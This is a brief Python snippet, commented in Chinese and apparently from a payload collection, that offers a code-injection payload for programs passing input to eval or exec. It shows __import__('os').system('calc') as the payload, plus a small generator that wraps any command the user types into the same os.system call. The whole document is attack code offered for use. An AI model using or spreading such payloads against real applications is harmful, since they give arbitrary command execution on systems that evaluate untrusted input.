#by leeya_bug

#适用于eval、exec等函数

#Payload: 
if False:
    __import__('os').system('calc')

#Payload生成
cmd = input('请输入命令: ')
print(f'''__import__('os').system('{cmd}')''')
